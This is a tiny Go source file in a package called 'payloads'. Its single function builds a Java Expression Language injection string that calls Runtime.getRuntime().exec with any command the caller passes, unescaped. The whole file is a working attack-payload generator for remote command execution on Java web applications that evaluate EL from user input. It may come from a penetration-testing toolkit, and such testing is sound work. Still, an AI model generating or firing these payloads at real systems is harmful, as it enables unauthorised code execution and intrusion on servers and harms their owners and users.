package payloads

// JavaELInjection returns a basic EL injection payload.
func JavaELInjection(cmd string) string {
	return `${Runtime.getRuntime().exec("` + cmd + `")}`
}
